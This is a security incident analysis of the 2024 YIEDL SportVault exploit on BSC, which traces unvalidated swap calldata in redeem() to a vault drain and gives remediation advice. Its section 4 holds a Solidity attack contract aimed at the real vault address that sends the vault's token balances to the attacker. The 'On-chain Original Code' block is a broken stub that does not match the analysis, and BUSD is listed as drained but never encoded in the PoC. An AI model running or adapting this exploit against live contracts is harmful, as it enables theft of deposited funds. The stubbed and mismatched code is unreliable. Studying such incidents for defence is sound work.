# YIEDL — SportVault redeem() unoswapTo Arbitrary Swap Analysis

| Field | Details |
|------|------|
| **Date** | 2024-04 |
| **Protocol** | YIEDL |
| **Chain** | BSC |
| **Loss** | Undisclosed (Multiple tokens: USDC, BTCB, BETH, BUSD) |
| **Vulnerable Contract** | [SportVault 0x4eDda16A](https://bscscan.com/address/0x4eDda16AB4f4cc46b160aBC42763BA63885862a4) |
| **USDC** | [0x8AC76a51](https://bscscan.com/address/0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d) |
| **BTCB** | [0x7130d2A1](https://bscscan.com/address/0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c) |
| **BETH** | [0x2170Ed08](https://bscscan.com/address/0x2170Ed0880ac9A755fd29B2688956BD959F933F8) |
| **Root Cause** | The `unoswapTo()` call embedded in the `dataList` parameter of `SportVault.redeem()` is executed without validation, swapping contract assets directly to the attacker's address |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-04/YIEDL_exp.sol) |

---

## 1. Vulnerability Overview

The `redeem()` function of YIEDL SportVault executes swap commands passed via the `dataList` parameter without any validation. An attacker encodes `unoswapTo(attacker, ...)` data into `dataList` and calls `redeem()`, causing SportVault to swap its held USDC, BTCB, BETH, and BUSD directly to the attacker's address. Notably, the swaps execute even when the number of shares to redeem is 0.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable code: redeem executes unoswapTo from dataList without validation
contract SportVault {
    function redeem(
        uint256 sharesToRedeem,
        address receivingAsset,
        uint256 minTokensToReceive,
        bytes[] calldata dataList,  // ← arbitrary swap commands
        bool useDiscount
    ) external {
        // dataList executes even when sharesToRedeem = 0
        for (uint i = 0; i < dataList.length; i++) {
            // Executes arbitrary swaps such as 1inch unoswapTo
            (bool ok,) = swapRouter.call(dataList[i]);
            require(ok);
        }
        // No recipient validation — the `to` address in dataList belongs to the attacker
    }
}

// ✅ Safe code: validate the destination address in dataList
function redeem(uint256 sharesToRedeem, address receivingAsset, uint256 min,
                bytes[] calldata dataList, bool useDiscount) external {
    require(sharesToRedeem > 0, "zero shares");
    for (uint i = 0; i < dataList.length; i++) {
        // The recipient in dataList must be msg.sender
        address recipient = decodeRecipient(dataList[i]);
        require(recipient == msg.sender, "invalid recipient");
        (bool ok,) = swapRouter.call(dataList[i]);
        require(ok);
    }
}
```

### On-chain Original Code

Source: Sourcify verified

```solidity
// File: YIEDL_decompiled.sol
contract YIEDL {
    function useUniswap() external {}  // ❌ vulnerability
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─→ [1] Construct dataList:
  │         └─ unoswapTo(attacker, USDC, btcbAmount, ...)
  │         └─ unoswapTo(attacker, BTCB, bethAmount, ...)
  │         └─ unoswapTo(attacker, BETH, busdAmount, ...)
  │
  ├─→ [2] SportVault.redeem(0, USDC, 0, dataList, false)
  │         └─ sharesToRedeem = 0 (no shares held)
  │         └─ dataList executed sequentially
  │         └─ each unoswapTo → SportVault assets → attacker
  │
  └─→ [3] USDC, BTCB, BETH, BUSD drained
```

## 4. PoC Code (Core Logic + Comments)

```solidity
interface ISportVault {
    function redeem(
        uint256 sharesToRedeem,
        address receivingAsset,
        uint256 minTokensToReceive,
        bytes[] calldata dataList,
        bool useDiscount
    ) external;
}

contract AttackContract {
    ISportVault constant vault = ISportVault(0x4eDda16AB4f4cc46b160aBC42763BA63885862a4);
    address constant USDC  = 0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d;
    address constant BTCB  = 0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c;
    address constant BETH  = 0x2170Ed0880ac9A755fd29B2688956BD959F933F8;
    address constant BUSD  = 0x55d398326f99059fF775485246999027B3197955;

    function testExploit() external {
        // [1] Construct unoswapTo calls: swap each token to the attacker's address
        bytes[] memory dataList = new bytes[](3);

        // USDC → attacker
        dataList[0] = encodeUnoswapTo(
            address(this),   // to: attacker
            USDC,
            IERC20(USDC).balanceOf(address(vault)),
            0
        );

        // BTCB → attacker
        dataList[1] = encodeUnoswapTo(
            address(this),
            BTCB,
            IERC20(BTCB).balanceOf(address(vault)),
            0
        );

        // BETH → attacker
        dataList[2] = encodeUnoswapTo(
            address(this),
            BETH,
            IERC20(BETH).balanceOf(address(vault)),
            0
        );

        // [2] Call redeem with shares = 0 → only dataList executes
        vault.redeem(0, USDC, 0, dataList, false);
    }

    function encodeUnoswapTo(address to, address token, uint256 amount, uint256 minOut)
        internal pure returns (bytes memory) {
        return abi.encodeWithSignature(
            "unoswapTo(address,address,uint256,uint256,bytes32[])",
            to, token, amount, minOut, new bytes32[](0)
        );
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|----------|
| **Vulnerability Type** | Arbitrary External Call (redeem dataList injection) |
| **CWE** | CWE-20: Improper Input Validation |
| **Attack Vector** | External (redeem dataList forgery) |
| **DApp Category** | Sports Betting Vault / Yield Aggregator |
| **Impact** | Full vault asset drain (USDC/BTCB/BETH/BUSD) |

## 6. Remediation Recommendations

1. **Validate dataList recipient**: The swap destination must always be `msg.sender`
2. **Enforce shares > 0**: Immediately revert if `sharesToRedeem == 0`
3. **Token whitelist**: Only allow swaps between approved token pairs
4. **Follow OpenZeppelin patterns**: Apply ERC-4626 standard vault design

## 7. Lessons Learned

- Following OpenLeverage2, Chainge Finance, and Seneca, the `dataList`/`callData` injection pattern continues to recur.
- Any vault contract design that allows users to supply arbitrary external swap commands directly requires recipient address validation without exception.
- Logic that executes swaps even when `sharesToRedeem == 0` permits asset drainage without shares validation.